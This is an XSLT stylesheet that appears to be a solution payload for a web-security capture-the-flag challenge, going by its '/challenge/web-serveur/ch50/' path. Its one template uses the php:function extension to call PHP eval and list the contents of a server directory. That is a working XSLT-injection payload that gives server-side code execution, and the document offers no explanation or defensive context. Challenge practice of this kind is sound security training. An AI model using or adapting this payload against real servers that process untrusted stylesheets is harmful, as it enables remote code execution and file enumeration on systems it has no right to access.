<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <xsl:template match="/">
 <xsl:value-of select='php:function("eval", "$d = scandir(\"/challenge/web-serveur/ch50/\");foreach($d as $k => $v){echo $v;}"'/>
 </xsl:template>
</xsl:stylesheet>
